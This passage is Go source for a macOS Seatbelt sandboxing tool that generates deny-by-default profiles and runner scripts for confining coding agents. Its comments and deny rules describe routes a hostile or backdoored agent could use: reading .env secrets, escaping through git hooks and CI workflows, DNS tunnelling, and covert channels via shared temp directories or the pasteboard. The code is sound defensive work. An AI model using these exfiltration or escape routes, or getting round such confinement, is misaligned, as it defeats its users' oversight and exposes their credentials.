//go:build darwin

// Package seatbelt implements the macOS Seatbelt (sandbox-exec) mechanism.
//
// Seatbelt has been marked deprecated for roughly seven years and still has no
// replacement for headless CLI use: App Sandbox requires code signing with an
// entitlement and an Xcode project, and Endpoint Security observes rather than
// confines. So it remains the only native way to apply a policy to an arbitrary
// child process on macOS, and it does work — including on macOS 26 — but it is
// unsupported and should be reported as a durability risk.
package seatbelt

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/danielcuthbert/sandboxcheckr/internal/mechanism"
	"github.com/danielcuthbert/sandboxcheckr/internal/model"
	"github.com/danielcuthbert/sandboxcheckr/internal/proxy"
	"github.com/danielcuthbert/sandboxcheckr/internal/sysexec"
)

// Mechanism implements mechanism.Mechanism for Seatbelt.
//
// Two variants are offered rather than one. The strict variant denies network
// outright and contains best; the practical variant permits egress so that a
// program which genuinely needs it — a coding agent, a package manager — can
// still run. Shipping only the strict variant would be tidier and worse: the
// predictable response to a sandbox that breaks your tool is to delete the rule
// that broke it, which silently discards the strongest protection available.
type Mechanism struct {
	network bool
	// proxyPort, when non-zero, denies all direct network access and permits
	// only a loopback connection to an allow-listing egress proxy.
	proxyPort int
	// autoPort makes the emitted runner pick a free port at run time instead
	// of baking proxyPort in. A fixed default port is how two sandboxes started
	// together ended up sharing one proxy: the second proxy failed to bind, and
	// the runner's readiness check found the FIRST proxy listening and carried
	// on under someone else's allow-list.
	autoPort bool
}

// NewStrict denies all network access.
func NewStrict() *Mechanism { return &Mechanism{network: false} }

// NewPractical permits network access, keeping every filesystem restriction.
func NewPractical() *Mechanism { return &Mechanism{network: true} }

// NewProxied denies all direct network access and permits only a loopback
// connection to an allow-listing egress proxy on the given port.
//
// This is the only configuration here that gives real per-host control. It is
// also strictly stronger than the practical variant on two counts beyond that:
// the confined program cannot open arbitrary sockets, and because the proxy
// resolves names on its behalf, DNS stays denied — which closes the
// DNS-tunnelling channel that "allow network" leaves wide open.
//
// With auto set, emitted runners choose a free port each run (port is then only
// the value written into the standalone .sb file).
func NewProxied(port int, auto bool) *Mechanism {
	return &Mechanism{network: true, proxyPort: port, autoPort: auto}
}

func (m *Mechanism) ID() string {
	switch {
	case m.proxyPort != 0:
		return "seatbelt-proxy"
	case m.network:
		return "seatbelt-network"
	default:
		return "seatbelt-strict"
	}
}

func (m *Mechanism) Name() string {
	switch {
	case m.proxyPort != 0:
		return "macOS Seatbelt — proxied (allow-listed egress)"
	case m.network:
		return "macOS Seatbelt — practical (network permitted)"
	default:
		return "macOS Seatbelt — strict (no network)"
	}
}

func (m *Mechanism) PermitsNetwork() bool { return m.network }

// BestFor implements mechanism.Mechanism.
func (m *Mechanism) BestFor() string {
	switch {
	case m.proxyPort != 0:
		return "coding agents: files locked down, network only to hosts you allow"
	case m.network:
		return "only if an allow-list is unworkable: files locked down, network wide open"
	default:
		return "builds, tests, install scripts: anything that needs no network"
	}
}

// Egress implements mechanism.Mechanism.
func (m *Mechanism) Egress() string {
	switch {
	case m.proxyPort != 0:
		return "proxy"
	case m.network:
		return "open"
	default:
		return "none"
	}
}

func (m *Mechanism) Tradeoff() string {
	if m.proxyPort != 0 {
		return "By construction the profile permits only a loopback connection to the allow-listing " +
			"proxy and denies direct sockets and DNS, so the proxy alone decides which hosts are " +
			"reachable — intended to defeat piped downloads and DNS tunnelling while a coding agent " +
			"still works. Confirm end to end with the net.egress probe. The residual risk is the " +
			"hosts you allow: one that stores or forwards is still a route out."
	}
	if m.network {
		return "The profile keeps the filesystem locked down but permits egress, so a piped download " +
			"can fetch and run code and readable data can leave. Use it when the program needs " +
			"network, and pair it with an egress proxy for real per-host control."
	}
	return "The profile denies the process its own network sockets — by construction, not by " +
		"observation — which is intended to block piped downloads and direct exfiltration; confirm " +
		"with the net.egress probe. Any program needing network, a coding agent included, will not work."
}

func (m *Mechanism) Summary() string {
	base := "Applies a kernel-enforced policy to a child process, restricting filesystem " +
		"access and network sockets. Deprecated by Apple but functional and still the only " +
		"native option for confining a command-line process."
	switch {
	case m.proxyPort != 0:
		return base + " This variant permits egress only to allow-listed hosts via a local proxy."
	case m.network:
		return base + " This variant permits network egress."
	default:
		return base + " This variant denies all network egress."
	}
}

// Detect verifies both that sandbox-exec exists and that it can actually
// compile and apply a profile.
//
// Checking for the binary alone is not enough. The binary is present on every
// macOS install, including inside a sandbox where it cannot be used. Applying a
// permissive profile distinguishes "available" from "present but unusable",
// which is precisely the case that produces a false negative.
func (m *Mechanism) Detect(ctx context.Context) model.Availability {
	path, err := sysexec.Lookup("sandbox-exec")
	if err != nil {
		return model.Availability{
			Status: model.StatusAbsent,
			Detail: "sandbox-exec is not present in a trusted system directory",
		}
	}

	out, err := sysexec.Run(ctx, path, "-p", "(version 1)(allow default)", "/usr/bin/true")
	if err != nil {
		low := strings.ToLower(out)
		if strings.Contains(low, "sandbox_apply") || strings.Contains(low, "not permitted") {
			return model.Availability{
				Status: model.StatusIndeterminate,
				Path:   path,
				Detail: "sandbox-exec is present but refused to apply even a permissive profile, " +
					"which happens when the caller is already sandboxed; run outside any sandbox to get a real answer",
			}
		}
		return model.Availability{
			Status: model.StatusIndeterminate,
			Path:   path,
			Detail: "sandbox-exec failed unexpectedly: " + strings.TrimSpace(out),
		}
	}

	// Applying a permissive profile only proves the mechanism works. It does not
	// prove OUR profile works, and a deny-default profile that is missing loader
	// rules does not fail gracefully — the child aborts inside dyld and macOS
	// files a crash report. So boot a trivial process under the real generated
	// profile before we ever point the probe harness at it.
	if detail, ok := verifyGeneratedProfile(ctx, path, m.network, m.proxyPort); !ok {
		return model.Availability{
			Status: model.StatusDegraded,
			Path:   path,
			Detail: "sandbox-exec works, but the profile SandboxCheckr generates could not " +
				"launch a process on this system: " + detail,
		}
	}

	return model.Availability{
		Status: model.StatusPass,
		Path:   path,
		Detail: "sandbox-exec is present, and the generated profile successfully launches a process",
	}
}

// verifyGeneratedProfile runs /usr/bin/true under the real profile, scoped to a
// throwaway directory. It answers the only question that matters before
// probing: can anything run in here at all?
func verifyGeneratedProfile(ctx context.Context, sandboxExec string, network bool, proxyPort int) (string, bool) {
	dir, err := os.MkdirTemp("", "sandboxcheckr-verify-*")
	if err != nil {
		return "could not create a temporary directory: " + err.Error(), false
	}
	defer os.RemoveAll(dir)
	// Resolve /var -> /private/var, or the profile will not match the path the
	// kernel checks against.
	if resolved, err := filepath.EvalSymlinks(dir); err == nil {
		dir = resolved
	}

	_ = os.MkdirAll(ScratchDir(dir), 0o700)
	profile := Profile(ProfileOpts{Workdir: dir, ExecPaths: []string{"/usr/bin"}, PermitNetwork: network, ProxyPort: proxyPort})
	out, err := sysexec.Run(ctx, sandboxExec, "-p", profile, "/usr/bin/true")
	if err == nil {
		return "", true
	}
	msg := strings.TrimSpace(out)
	if msg == "" {
		msg = err.Error()
	}
	return msg, false
}

// ProfileOpts parameterises the generated policy.
type ProfileOpts struct {
	// PermitNetwork allows egress. Off by default: the safer value is the one
	// you get when you forget to set it.
	PermitNetwork bool
	// ProxyPort, when non-zero, permits ONLY a loopback connection to that port
	// and overrides PermitNetwork. DNS stays denied because the proxy resolves
	// on the program's behalf.
	ProxyPort int
	// Workdir is the one directory the confined program may write to.
	Workdir string
	// ExecPaths are directories holding the program to be run and anything it
	// executes. They are granted read and file-map-executable.
	//
	// This is not optional detail. A program is almost never inside the
	// workdir — yours lives in your home directory, which this profile
	// otherwise denies — and without map-executable permission on its own
	// binary the process dies in the dynamic loader before main() runs.
	ExecPaths []string
	// AllowDotenv drops the protection on .env files inside the workdir.
	// Off by default: secrets kept next to the code are exactly what a
	// hostile model asks the agent to read.
	AllowDotenv bool
	// AllowExecConfig drops the write protection on files that other programs
	// execute later (git hooks and config, CI workflows, editor tasks).
	AllowExecConfig bool
}

// Markers delimiting the workdir protection blocks in a generated profile.
// The runner finds them by these exact lines, moves them after any EXTRA_*
// grants (Seatbelt lets the later rule win, so a grant appended after a deny
// would undo it), and drops one when the user opts out of it.
const (
	beginDotenv     = ";; BEGIN protect-dotenv"
	endDotenv       = ";; END protect-dotenv"
	beginExecConfig = ";; BEGIN protect-exec-config"
	endExecConfig   = ";; END protect-exec-config"
)

// sbplRegex renders a Seatbelt regex filter matching workdir-relative paths
// described by the (already-escaped) ERE suffix.
func sbplRegex(workdir, suffix string) string {
	return fmt.Sprintf("(regex %q)", "^"+regexp.QuoteMeta(workdir)+"/"+suffix)
}

// protectionRules renders the workdir protection blocks. See SBX-011.
func protectionRules(o ProfileOpts) string {
	var b strings.Builder
	if !o.AllowDotenv {
		dotenv := sbplRegex(o.Workdir, `(.*/)?\.env(\.[^/]*)?$`)
		b.WriteString("\n" + beginDotenv + `
;; .env files inside the project hold the credentials the code itself uses —
;; the one thing a hostile or backdoored model most wants the agent to read.
;; Its contents cannot be read (its existence still can, so ls and git status
;; keep working), and it cannot be written, renamed or hard-linked: otherwise
;; moving or linking it to another name would make it readable again. The
;; pattern matches at any depth, so renaming a parent directory does not help.
`)
		fmt.Fprintf(&b, "(deny file-read-data file-write* file-link %s)\n", dotenv)
		b.WriteString(endDotenv + "\n")
	}
	if !o.AllowExecConfig {
		b.WriteString("\n" + beginExecConfig + `
;; Files that make OTHER programs run code later, outside this sandbox: git
;; hooks and config (core.hooksPath, core.fsmonitor), CI workflows, editor
;; task definitions, direnv. Writing one is not an escape yet — you complete
;; it the next time you commit, push or open the editor.
;;
;; .git and .github are protected at the project root only, so the program can
;; still clone or init repositories inside it; the root .git and .github
;; directories themselves cannot be created, renamed or deleted, which would
;; otherwise let a renamed copy be edited and moved back. Editor and hook
;; configuration is protected at any depth.
`)
		for _, suffix := range []string{
			`\.git/hooks(/.*)?$`,
			`\.git/config$`,
			`\.git$`,
			`\.github/workflows(/.*)?$`,
			`\.github$`,
			`(.*/)?\.vscode(/.*)?$`,
			`(.*/)?\.idea(/.*)?$`,
			`(.*/)?\.husky(/.*)?$`,
			`(.*/)?\.envrc$`,
			`(.*/)?\.pre-commit-config\.yaml$`,
		} {
			fmt.Fprintf(&b, "(deny file-write* file-link %s)\n", sbplRegex(o.Workdir, suffix))
		}
		b.WriteString(endExecConfig + "\n")
	}
	return b.String()
}

// ScratchDir is the private temp directory for a sandbox scoped to workdir.
//
// Each sandbox gets its own rather than sharing /tmp, so two confined processes
// cannot use scratch space to talk to each other.
func ScratchDir(workdir string) string {
	return filepath.Join(workdir, ".sandboxcheckr-tmp")
}

// defaultExecPaths are the usual homes for interpreters and toolchains. They
// are read-and-execute only; none of them are writable under this profile.
var defaultExecPaths = []string{
	"/usr/bin", "/bin", "/usr/sbin", "/sbin",
	"/usr/local/bin", "/opt/homebrew", "/nix/store",
}

// Profile renders the Seatbelt policy.
//
// This is the single source of truth for the policy: Confine runs it and
// Wrapper prints it, so what we test and what we recommend cannot diverge.
//
// Shape: deny by default, then grant back the minimum needed to (a) boot a
// process at all and (b) do work inside the workdir. Note what is NOT granted —
// the home directory, and any network access.
//
// The dyld-support import is load-bearing. macOS 26 bootstraps processes
// through libignition, which needs read and map access to the Cryptex graft
// points plus a specific set of syscalls. A deny-default profile without those
// rules does not produce a permission error; the process aborts inside dyld
// before reaching main, which surfaces to the user as a crash report rather
// than as a sandbox denial. Apple maintains these rules in
// /System/Library/Sandbox/Profiles/dyld-support.sb and imports them into its
// own profiles, so importing is both correct and version-matched to the OS.
func Profile(o ProfileOpts) string {
	var b strings.Builder

	b.WriteString(`(version 1)

;; Generated by SandboxCheckr. Deny everything, then grant back the minimum.
(deny default)

;; Rules required to bootstrap a process with dyld. Apple ships and maintains
;; these; without them a deny-default profile aborts in the loader (libignition)
;; before the program starts. See the gap list: this is a private interface.
(import "dyld-support.sb")

;; Allow traversal of symlinks and parent directories.
(allow file-read-metadata)

;; Read the system: the loader, shared caches, frameworks and dylibs.
(allow file-read* file-test-existence
  (subpath "/usr/lib")
  (subpath "/usr/share")
  (subpath "/System")
  (subpath "/Library/Apple"))

;; Mapping a file as executable is a SEPARATE operation from reading it.
;; Granting file-read* alone is the most common reason a deny-default profile
;; fails to launch anything at all.
(allow file-map-executable
  (subpath "/usr/lib")
  (subpath "/System/Library/Frameworks")
  (subpath "/System/Library/PrivateFrameworks")
  (subpath "/System/Library/SubFrameworks"))

(allow process-exec*)
(allow process-fork)
(allow sysctl-read)

;; IPC the loader and libc require. Without these most binaries fail to start.
(allow mach-lookup)
(allow ipc-posix-shm)
(allow signal (target self))

;; The program being confined, and any interpreters it needs: read and execute,
;; never write.
`)

	seen := map[string]bool{}
	for _, p := range append(append([]string{}, o.ExecPaths...), defaultExecPaths...) {
		if p == "" || seen[p] {
			continue
		}
		seen[p] = true
		fmt.Fprintf(&b, "(allow file-read* file-test-existence file-map-executable (subpath %q))\n", p)
	}

	b.WriteString("\n;; The project directory: the one place the confined program may write.\n")
	fmt.Fprintf(&b, "(allow file-read* file-write* (subpath %q))\n", o.Workdir)
	fmt.Fprintf(&b, "(allow file-read* file-write* (subpath %q))\n", ScratchDir(o.Workdir))
	// Protections come straight after the workdir grant they narrow, and the
	// runner re-appends them after any EXTRA_* grants (later rules win).
	b.WriteString(protectionRules(o))

	b.WriteString(`
;; Scratch space.
;;
;; NOT the shared /private/tmp. Granting the world-writable temp directory hands
;; every sandboxed process a channel to every other one: they can exchange files,
;; and even with file contents blocked they can signal through directory names
;; (as agents did in the 2026 OpenAI-Hugging Face incident, via a shared
;; registry). Instead each sandbox gets a private scratch directory inside its
;; own workdir, and TMPDIR is pointed at it.

;; Devices that are safe and universally required.
(allow file-read* file-write*
  (literal "/dev/null")
  (literal "/dev/zero")
  (literal "/dev/random")
  (literal "/dev/urandom")
  (literal "/dev/dtracehelper")
  (literal "/dev/tty"))

;; Explicit denials for a high-value channel. deny-default already refuses this,
;; but stating it makes the intent auditable and keeps it denied even if a broad
;; allow is added later. Apple Events are cross-app automation — a confined
;; process could otherwise drive Safari/Mail/Terminal to act outside the sandbox.
;; (If a macOS release renamed this operation the profile would fail to load, and
;; Detect would report DEGRADED rather than silently shipping a broken policy.)
(deny appleevent-send)

;; The pasteboard server is a cross-process channel that filesystem and
;; network rules do not touch: anything copied in another app is readable, and
;; anything written is readable by the next app to paste. Deny it by name.
;; (mach-lookup as a whole stays open because dyld and libSystem need a set of
;; services that varies by OS release; a full allow-list is on the backlog and
;; must be built from a live trace, not guessed.)
(deny mach-lookup (global-name "com.apple.pasteboard.1"))
`)

	// Network rules are emitted LAST and deny-before-allow, because Seatbelt
	// resolves conflicts by taking the rule that appears later. An allow written
	// above a blanket deny is silently overridden — which would leave the
	// proxied variant with no network at all, quietly breaking the one feature
	// it exists to provide.
	b.WriteString("\n;; Deny all network first; any narrowing allow must follow it to take effect.\n")
	b.WriteString("(deny network*)\n")

	if o.ProxyPort == 0 && !o.PermitNetwork {
		b.WriteString(`
;; The strict variant also refuses the keychain service. Programs read keychain
;; items through securityd over Mach, not through the files, so denying the
;; files alone leaves every item without a per-app access list readable. This is
;; only done in the strict variant: coding agents (Claude Code among them) keep
;; their login in the keychain and would stop working in the networked ones.
(deny mach-lookup (global-name "com.apple.SecurityServer"))
(deny mach-lookup (global-name "com.apple.securityd.xpc"))
`)
	}

	switch {
	case o.ProxyPort != 0:
		b.WriteString(`
;; Egress is permitted ONLY to the allow-listing proxy on loopback. Direct
;; sockets stay denied, and so does DNS: the proxy resolves names on the
;; program's behalf, which also closes DNS tunnelling. Per-host policy lives in
;; the proxy, because Seatbelt cannot express it.
`)
		// SBPL accepts only "*" or "localhost" as the host in a remote ip
		// filter — a numeric 127.0.0.1 is rejected at compile time ("host must
		// be * or localhost"), which is how an earlier version of this profile
		// broke. "localhost" here means the loopback interface, so it matches
		// the proxy bound on 127.0.0.1; the probe run confirms it end to end
		// through net.proxy.reachable.
		fmt.Fprintf(&b, "(allow network-outbound (remote ip \"localhost:%d\"))\n", o.ProxyPort)
	case o.PermitNetwork:
		b.WriteString(`
;; Network is PERMITTED in this variant so the confined program can function.
;; Seatbelt cannot filter by hostname, so this is unrestricted egress: a piped
;; download still works. See the gap list before relying on this.
(allow network*)
`)
	}

	return b.String()
}

// Confine builds the command that runs argv inside the Seatbelt sandbox.
func (m *Mechanism) Confine(ctx context.Context, w mechanism.Workdir, argv []string) (*exec.Cmd, error) {
	if len(argv) == 0 {
		return nil, fmt.Errorf("no command supplied")
	}
	path, err := sysexec.Lookup("sandbox-exec")
	if err != nil {
		return nil, fmt.Errorf("sandbox-exec unavailable: %w", err)
	}

	// Grant the target binary's own directory. Without this the loader cannot
	// map the executable and the process aborts before main().
	if dir := filepath.Dir(argv[0]); mechanism.TooBroadToGrant(dir) {
		return nil, fmt.Errorf("refusing to grant %s (the directory of %s): / and $HOME are too broad; move the binary into its own directory", dir, argv[0])
	}
	opts := ProfileOpts{
		Workdir:       w.Path,
		ExecPaths:     []string{filepath.Dir(argv[0])},
		PermitNetwork: m.network,
		ProxyPort:     m.proxyPort,
	}

	// -p passes the profile inline, avoiding a temp file that would itself need
	// to be readable from inside the sandbox.
	args := append([]string{"-p", Profile(opts)}, argv...)
	// Create the private scratch directory before the child starts; it cannot
	// create it itself if the profile only grants access to paths that exist.
	scratch := ScratchDir(w.Path)
	if err := os.MkdirAll(scratch, 0o700); err != nil {
		return nil, fmt.Errorf("creating private scratch dir: %w", err)
	}

	cmd := exec.CommandContext(ctx, path, args...)
	cmd.Dir = w.Path
	// The child gets exactly the environment the emitted wrapper gives a real
	// program — no more, no less. If the probes ran with a scrubbed environment
	// while the wrapper passed the caller's through, exfil.env.secrets and
	// exfil.proxy.env would credit the sandbox for protection the user never
	// gets. mechanism.SandboxEnv is the single definition both sides use.
	var extra []string
	if m.proxyPort != 0 {
		extra = mechanism.ProxyEnv(fmt.Sprintf("http://127.0.0.1:%d", m.proxyPort))
	}
	cmd.Env = mechanism.SandboxEnv(homeDir(), scratch, extra)
	return cmd, nil
}

// ProxyEndpoint implements mechanism.Proxied for the proxied variant. The
// other variants never call it: the harness only asks mechanisms that report a
// proxy port.
func (m *Mechanism) ProxyEndpoint(mechanism.Workdir) (string, string) {
	return "tcp", fmt.Sprintf("127.0.0.1:%d", m.proxyPort)
}

// ChildProxyAddr implements mechanism.Proxied.
func (m *Mechanism) ChildProxyAddr() string { return fmt.Sprintf("127.0.0.1:%d", m.proxyPort) }

// UsesProxy reports whether this variant needs the proxy running.
func (m *Mechanism) UsesProxy() bool { return m.proxyPort != 0 }

// Wrapper renders the artifact a user can run, from the same Profile the
// probes just exercised.
//
// Every variant ships as a runner script plus its profile, never as a bare .sb.
// A profile alone leaves too much to the user that the probes depended on: the
// private scratch directory has to exist, TMPDIR has to point at it, the
// environment has to be scrubbed the same way it was during probing, and the
// program's own directory has to be granted or it dies in the loader. The
// runner does all four, so "the configuration we tested" and "the
// configuration you run" are the same thing.
func (m *Mechanism) Wrapper(w mechanism.Workdir) (mechanism.Artifact, error) {
	profileName := m.ID() + ".sb"
	script := runnerScript(m, profileName, w)

	notes := []string{
		"Run: sh " + m.ID() + ".sh <command> [args...]   (keep " + profileName + " next to the script)",
		"The runner clears the environment before starting the program, exactly as the probes were run. " +
			"API keys and tokens in your shell are NOT passed in unless you name them in PASS_ENV — " +
			"pass only what the program needs, because anything passed is readable and exfiltratable.",
		"The command's own install directory (and its interpreter's, for scripts) is granted read+execute " +
			"automatically. Add anything else it needs to read in EXTRA_RO, or read/write in EXTRA_RW. " +
			"For Claude Code that is typically: EXTRA_RW=\"$HOME/.claude $HOME/.claude.json\".",
		"Scratch space is a private .sandboxcheckr-tmp inside the workdir, not the shared /tmp; the runner creates it and points TMPDIR at it.",
		"Inside the workdir, .env files cannot be read and git hooks/config, CI workflows, editor tasks (.vscode, .idea), " +
			".husky, .envrc and .pre-commit-config.yaml cannot be written — they hold secrets, or code another program runs " +
			"later outside the sandbox. Opt out per class with ALLOW_DOTENV=1 or ALLOW_EXEC_CONFIG=1. package.json scripts, " +
			"Makefiles and the like cannot be protected this way: review the diff before you run them.",
		"Debug an over-tight profile with: log stream --style compact --predicate 'sender == \"Sandbox\"'",
	}
	switch {
	case m.proxyPort != 0:
		notes = append(notes,
			"Discover the allow-list instead of guessing: sandboxcheckr proxy --observe, then add the hosts you accept to ALLOW.",
			"Direct sockets AND DNS are denied inside the sandbox. If the program bypasses HTTP_PROXY it simply gets no network, which fails closed.",
			"Older Node and Bun ignore HTTP(S)_PROXY. NODE_USE_ENV_PROXY=1 (set by this script) covers fetch and http/https on Node 22.21+ and 24.5+ (fetch only on 24.0–24.4); it is used rather than NODE_OPTIONS=--use-env-proxy because older Node refuses to start with an unknown flag there. A Bun program needs a preload shim. A runtime that ignores the proxy fails closed rather than leaking — but it also won't work until you make it honour the proxy.")
		notes = append(notes, proxy.KnownLimits()...)
	case m.network:
		notes = append(notes, "This variant permits unrestricted network. Prefer seatbelt-proxy, which allow-lists hosts.")
	default:
		notes = append(notes, "This variant denies all network access. If the program needs network — a coding agent will — use seatbelt-proxy rather than editing the profile.")
	}

	return mechanism.Artifact{
		FileName: m.ID() + ".sh",
		FileBody: script,
		Command:  "sh " + m.ID() + ".sh <your-command>",
		Notes:    notes,
		ExtraFiles: map[string]string{
			profileName: Profile(ProfileOpts{Workdir: w.Path, PermitNetwork: m.network, ProxyPort: m.proxyPort}),
		},
	}, nil
}

// runnerScript renders the POSIX sh runner shared by every variant.
//
// Extra grants are appended to the profile at run time and passed inline with
// -p, because Seatbelt takes one profile and the command's location is only
// known when the script runs. Paths are escaped for SBPL string syntax so a
// directory name cannot terminate the string and inject rules.
func runnerScript(m *Mechanism, profileName string, w mechanism.Workdir) string {
	var b strings.Builder
	b.WriteString("#!/bin/sh\n")
	fmt.Fprintf(&b, "# Generated by SandboxCheckr (%s), scoped to %s\n", m.ID(), w.Path)
	b.WriteString("#\n# Usage: sh " + m.ID() + ".sh <command> [args...]\n#\n")
	b.WriteString("# Tunables, all optional, set in the environment when invoking:\n")
	b.WriteString("#   PASS_ENV  names of variables to pass in (default: none)\n")
	b.WriteString("#   EXTRA_RO  extra paths the program may read\n")
	b.WriteString("#   EXTRA_RW  extra paths the program may read and write\n")
	b.WriteString("#   ALLOW_DOTENV=1       let the program read and write .env files in the workdir\n")
	b.WriteString("#   ALLOW_EXEC_CONFIG=1  let it write git hooks/config, CI workflows, editor tasks\n")
	if m.proxyPort != 0 {
		b.WriteString("#   ALLOW     proxy allow-list flags (default: --allow api.anthropic.com)\n")
		b.WriteString("#   PORT      loopback proxy port\n")
		b.WriteString("#   AGENT     label for this run in the event log (default: <command>-<pid>)\n")
		b.WriteString("#   EVENTS    event log for sandboxcheckr console (default: ~/.local/state/sandboxcheckr/events.jsonl)\n")
		b.WriteString("#   DENY_FILE hosts to cut off live, even if allowed (default: ~/.config/sandboxcheckr/deny.txt)\n")
		b.WriteString("#   CANARY=0  disable planted credentials; CANARY_KILL=1 stops on a high-confidence trip\n")
	}
	b.WriteString("set -eu\n\n")
	b.WriteString("HERE=$(cd \"$(dirname \"$0\")\" && pwd)\n")
	fmt.Fprintf(&b, "PROFILE=\"$HERE/%s\"\n", profileName)
	fmt.Fprintf(&b, "WORKDIR=%s\n", shQuote(w.Path))
	b.WriteString("SCRATCH=\"$WORKDIR/.sandboxcheckr-tmp\"\n")
	b.WriteString("PASS_ENV=\"${PASS_ENV:-}\"\nEXTRA_RO=\"${EXTRA_RO:-}\"\nEXTRA_RW=\"${EXTRA_RW:-}\"\n")
	if m.proxyPort != 0 {
		b.WriteString("ALLOW=\"${ALLOW:---allow api.anthropic.com}\"\n")
		if m.autoPort {
			b.WriteString("PORT=\"${PORT:-0}\"   # 0 = pick a free port each run\n")
		} else {
			fmt.Fprintf(&b, "PORT=\"${PORT:-%d}\"\n", m.proxyPort)
		}
		b.WriteString("PROXY_LOG=\"${PROXY_LOG:-$WORKDIR/.sandboxcheckr-tmp/proxy.log}\"\n")
		// The event log lives outside the workdir, where the sandboxed program
		// cannot forge or erase it, and is shared by every runner so the
		// console can compare agents.
		b.WriteString("EVENTS=\"${EVENTS:-${XDG_STATE_HOME:-$HOME/.local/state}/sandboxcheckr/events.jsonl}\"\n")
		// Shared by every runner, outside the workdir: the agent must not be
		// able to edit its own kill switch.
		b.WriteString("DENY_FILE=\"${DENY_FILE:-${XDG_CONFIG_HOME:-$HOME/.config}/sandboxcheckr/deny.txt}\"\n")
		// Not "${SANDBOXCHECKR:-'...'}": inside double quotes the single quotes
		// would be kept literally and the path would never resolve.
		fmt.Fprintf(&b, "SANDBOXCHECKR_DEFAULT=%s\n", selfPathForScript())
		b.WriteString("SANDBOXCHECKR=\"${SANDBOXCHECKR:-$SANDBOXCHECKR_DEFAULT}\"\n")
	}
	b.WriteString(runnerBody)
	if m.proxyPort != 0 {
		b.WriteString(runnerProxy)
	} else {
		b.WriteString("PROFILE_TEXT=$(cat \"$PROFILE\")\n")
	}
	b.WriteString(runnerProtect)
	b.WriteString(runnerArgv)
	if m.proxyPort != 0 {
		b.WriteString(runnerProxyEnv)
	}
	b.WriteString(runnerExec)
	if m.proxyPort != 0 {
		// Not exec: the shell must survive to run the EXIT trap that stops
		// the proxy.
		b.WriteString(runnerProxyExec)
	} else {
		b.WriteString("exec \"$@\"\n")
	}
	return b.String()
}

const runnerBody = `
[ $# -ge 1 ] || { echo "usage: sh $0 <command> [args...]" >&2; exit 2; }
[ -f "$PROFILE" ] || { echo "missing $PROFILE (emit it again with sandboxcheckr --emit)" >&2; exit 2; }
mkdir -p "$SCRATCH"

# Seatbelt matches real paths, so resolve symlinks before granting anything.
realpath_of() { /bin/realpath "$1" 2>/dev/null || printf '%s\n' "$1"; }
# Quote a path as an SBPL string literal, so it cannot inject rules.
sbpl_str() { printf '"%s"' "$(printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g')"; }

# Never grant / or $HOME (or anything above $HOME): either would hand the
# program every credential the profile exists to keep from it. Paths are
# compared after resolving symlinks, so a link to / is caught too.
HOME_REAL=$(realpath_of "${HOME:-/var/empty}")
too_broad() { # too_broad <resolved path>
  case "$1" in
    ""|/|*/..|*/../*|*/.|*/./*|[!/]*) return 0 ;;
  esac
  [ "$1" = "$HOME_REAL" ] && return 0
  case "$HOME_REAL/" in "$1"/*) return 0 ;; esac
  return 1
}

EXTRA=""
grant() { # grant <rights> <path>; fails, granting nothing, if the path is too broad
  _p=$(realpath_of "$2")
  while [ "$_p" != "${_p%/}" ] && [ "$_p" != / ]; do _p=${_p%/}; done
  too_broad "$_p" && return 1
  EXTRA="$EXTRA
(allow $1 (subpath $(sbpl_str "$_p")))"
}
# Automatic grants are best-effort: skip one that is too broad, with a note.
grant_auto() { grant "$1" "$2" || echo "sandboxcheckr: not granting $2 (too broad)" >&2; }
EXEC_RIGHTS="file-read* file-test-existence file-map-executable"

# Grant the command's install directory and its parent. Launchers installed by
# npm, nvm or Homebrew are symlinks whose real file sits a level or two inside
# a package root, and the program loads its own modules from there.
CMD_PATH=$(command -v "$1" 2>/dev/null) || { echo "command not found: $1" >&2; exit 127; }
CMD_REAL=$(realpath_of "$CMD_PATH")
CMD_DIR=$(dirname "$CMD_REAL")
PATH_DIRS=$(dirname "$CMD_PATH")
grant_auto "$EXEC_RIGHTS" "$(dirname "$CMD_PATH")"
grant_auto "$EXEC_RIGHTS" "$CMD_DIR"
grant_auto "$EXEC_RIGHTS" "$(dirname "$CMD_DIR")"

# A script's interpreter (#!/usr/bin/env node) needs the same grant, or the
# kernel can start the script but not the interpreter it names.
if [ "$(head -c 2 "$CMD_REAL" 2>/dev/null)" = "#!" ]; then
  INTERP=$(head -n 1 "$CMD_REAL" | sed 's/^#![[:space:]]*//')
  case "$INTERP" in
    */env\ *) INTERP=$(command -v "${INTERP#*/env }" 2>/dev/null || true) ;;
    *) INTERP=${INTERP%% *} ;;
  esac
  if [ -n "$INTERP" ]; then
    INTERP_DIR=$(dirname "$(realpath_of "$INTERP")")
    grant_auto "$EXEC_RIGHTS" "$INTERP_DIR"
    grant_auto "$EXEC_RIGHTS" "$(dirname "$INTERP_DIR")"
    PATH_DIRS="$PATH_DIRS:$(dirname "$INTERP")"
  fi
fi

# An explicit request for / or $HOME is refused outright rather than skipped,
# so nobody runs believing they are confined when they asked not to be.
for p in $EXTRA_RO; do
  grant "file-read* file-test-existence" "$p" || { echo "refusing EXTRA_RO path $p: / and \$HOME are too broad to grant" >&2; exit 2; }
done
for p in $EXTRA_RW; do
  grant "file-read* file-write*" "$p" || { echo "refusing EXTRA_RW path $p: / and \$HOME are too broad to grant" >&2; exit 2; }
done

`

// runnerProtect moves the workdir protection blocks to the end of the
// profile, after any EXTRA_RO / EXTRA_RW grants. Seatbelt takes the LAST
// matching rule, so a grant appended after the deny — EXTRA_RW naming the
// project itself, say — would quietly undo it. Each block is dropped only when
// the user explicitly opts out of it.
const runnerProtect = `
# Workdir protections (SBX-011): no .env reads, no writes to files other
# programs execute later. Re-applied after EXTRA_* so a grant cannot undo them.
protect_block() { printf '%s\n' "$PROFILE_TEXT" | sed -n "/^;; BEGIN $1\$/,/^;; END $1\$/p"; }
PROTECT=""
if [ "${ALLOW_DOTENV:-0}" = 1 ]; then
  echo "sandboxcheckr: ALLOW_DOTENV=1 — .env files in the workdir are readable by the program" >&2
else
  PROTECT="$PROTECT
$(protect_block protect-dotenv)"
fi
if [ "${ALLOW_EXEC_CONFIG:-0}" = 1 ]; then
  echo "sandboxcheckr: ALLOW_EXEC_CONFIG=1 — git hooks, CI workflows and editor tasks are writable; review them before you commit or open the editor" >&2
else
  PROTECT="$PROTECT
$(protect_block protect-exec-config)"
fi
PROFILE_TEXT=$(printf '%s\n' "$PROFILE_TEXT" | sed '/^;; BEGIN protect-/,/^;; END protect-/d')
`

// runnerArgv builds the final argv by prepending: sandbox-exec, then the
